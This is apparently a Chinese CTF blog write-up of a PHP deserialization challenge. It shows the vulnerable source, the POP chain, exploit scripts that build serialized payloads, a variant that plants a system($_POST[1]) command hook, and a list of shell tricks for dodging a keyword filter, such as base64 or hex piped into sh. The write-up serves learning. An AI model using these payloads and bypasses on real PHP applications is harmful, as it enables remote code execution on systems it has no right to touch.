---
layout: mypost
title: "[香山杯 2023]PHP_unserialize_pro"
categories: [ctf_wp]
---

## 前言

香山杯的这道题其实反序列化一眼就能看出 pop 链，难的可能就是这个正则的绕过方法，多刷题多总结就行了。

## 解题

1.观察源码

![](1.png)

```php
<?php
    error_reporting(0);
    class Welcome{
        public $name;
        public $arg = 'welcome';
        public function __construct(){
            $this->name = 'Wh0 4m I?';
        }
        public function __destruct(){
            if($this->name == 'A_G00d_H4ck3r'){
                echo $this->arg;
            }
        }
    }

    class G00d{
        public $shell;
        public $cmd;
        public function __invoke(){
            $shell = $this->shell;
            $cmd = $this->cmd;
            if(preg_match('/f|l|a|g|\*|\?/i', $cmd)){
                die("U R A BAD GUY");
            }
            eval($shell($cmd));
        }
    }

    class H4ck3r{
        public $func;
        public function __toString(){
            $function = $this->func;
            $function();
        }
    }

    if(isset($_GET['data']))
        unserialize($_GET['data']);
    else
        highlight_file(__FILE__);
?>
```

一步一步来，先找一下危险函数在哪里，很明显就是 G00d 里面的 eval 函数，那么想要触发这个函数，就得先触发 G00d.invoke（）这个魔术方法。

```
__invoke()：当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用
```

很明显，让令 H4ck3r 类里面的$func让它等于一个对象就可以，然后这个$function()是在 H4ck3r.tostring 里面的，要想要触发这个 tostring（）函数的话，就是要先到 Welcome.destruct()函数，因为正则匹配就是针对于字符串的匹配，把这个要匹配的字符串传成一个对象即可。

```
__toString()：当一个对象被当作一个字符串时使用
```

再看，反序列化的实质就是将字符串转换为对象，虽然也是生成了一个对象，但这个过程确实是不会去触发构造函数的（构造函数只有 new 才会触发），但是这个对象被销毁的时候，一定是会触发析构函数的，所以这个析构函数所在的类，就是要序列化的对象，序列化这个对象，才可以将各个类联系起来。

pop 链

```
__destruct()->__toString()->__invoke()
```

2.编写 exp 如下-->

```php
<?php
    error_reporting(0);
    class Welcome{
        public $name;
        public $arg = 'welcome';
        public function __construct(){
            $this->name = 'Wh0 4m I?';
        }
        public function __destruct(){
            if($this->name == 'A_G00d_H4ck3r'){
                echo $this->arg;
            }
        }
    }

    class G00d{
        public $shell = "strtolower";
        public $cmd = 'dir ../../../../../';#查看文件名
        public $cmd = "show_source(chr(47).chr(102).chr(49).chr(97).chr(103));";

    }

    class H4ck3r{
        public $func;
        public function __toString(){
            $function = $this->func;
            $function();
        }
    }
$a = new Welcome();
$b = new G00d();
$c = new H4ck3r();
$a->name = "A_G00d_H4ck3r";
$a->arg = $c;
$c->func = $b;
echo serialize($a);
?>
```

先用第一步查看根目录下有一个名为 f1ag 的文件，然后再读取就行了，分别对应着上面两个 cmd 里面的内容，记得是分别序列化。总结一下 flag 关键字被过滤还有哪些方法-->

```
反斜线转义 cat fla\g.php

两个单引号做分隔 cat fl''ag.php

base64编码绕过 echo Y2F0IGZsYWcucGhw | base64 -d | sh

hex编码绕过 echo 63617420666c61672e706870 | xxd -r -p | bash

glob通配符 cat f[k-m]ag.php cat f[l]ag.php

?和*

cat f{k..m}ag.php

定义变量做拼接 a=g.php; cat fla$a

内联执行cat echo 666c61672e706870 | xxd -r -p 或 cat $(echo 666c61672e706870 | xxd -r -p) 或 echo 666c61672e706870 | xxd -r -p | xargs cat
```

## 记录

在网上看到另一种写法，具体如下：

```php
<?php
    class Welcome {
        public $name;
        public $arg = 'welcome';
    }

    class G00d {
        public $shell;
        public $cmd;
    }

    class H4ck3r {
        public $func;
    }

$h = new H4ck3r();
$w = new Welcome();
$g = new G00d();
$w->name = "A_G00d_H4ck3r";
$w->arg = $h;
$h->func = $g;
$g->shell = "urldecode";
$g->cmd = "system(\$_POST[1]);";
echo serialize($w);

//O:7:"Welcome":2:{s:4:"name";s:13:"A\_G00d\_H4ck3r";s:3:"arg";O:6:"H4ck3r":1:{s:4:"func";O:4:"G00d":2:{s:5:"shell";s:9:"urldecode";s:3:"cmd";s:18:"system($\_POST\[1\]);";}}}
```

![](2.png)

还有一点绕过姿势，简单记录

```
 class G00d{
        public $shell = "system";
        public $cmd = 'dir ../../../../../';#查看文件名
        public $cmd = "more /[e-h]1[0-b][e-h]";#1
        public $cmd = "sort /[!q]1[!q][!q]";#2
        public $cmd = "cd /;echo `more dir`";#3
        public $cmd = "cd /;more `php -r "echo chr(102).chr(49).chr(97).chr(103);"`";";#4
    }
```

![](3.png)

师傅们确实强 ORZ，ORZ。